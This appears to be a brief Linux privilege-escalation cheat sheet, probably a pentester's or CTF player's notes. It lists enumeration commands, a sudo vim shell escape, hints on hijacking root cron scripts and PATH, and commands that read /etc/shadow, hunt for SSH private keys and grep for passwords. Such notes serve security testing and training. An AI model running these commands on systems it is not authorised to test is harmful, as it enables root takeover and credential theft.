# linux privilege escalation

## Enumeration
id; whoami; sudo -l
uname -a; cat /etc/os-release
find / -perm -4000 -type f 2>/dev/null     # SUID binaries
find / -writable -type d 2>/dev/null
getcap -r / 2>/dev/null                     # file capabilities
cat /etc/crontab; ls -la /etc/cron.*
ss -tulpn                                   # listening services
env; cat ~/.bash_history

## sudo / SUID
sudo -l                                     # what can I run as root?
# check GTFOBins for any allowed/SUID binary:
#   https://gtfobins.github.io
sudo vim -c ':!/bin/sh'                      # example escape

## Cron / PATH
# writable script run by root cron -> inject payload
# writable dir early in root PATH -> plant a binary

## Kernel / tools
# automated:
./linpeas.sh
# kernel exploits: match `uname -r` on exploit-db

## Interesting files
cat /etc/passwd; cat /etc/shadow 2>/dev/null
find / -name "*.bak" 2>/dev/null
find /home -name id_rsa 2>/dev/null
grep -rin password / 2>/dev/null
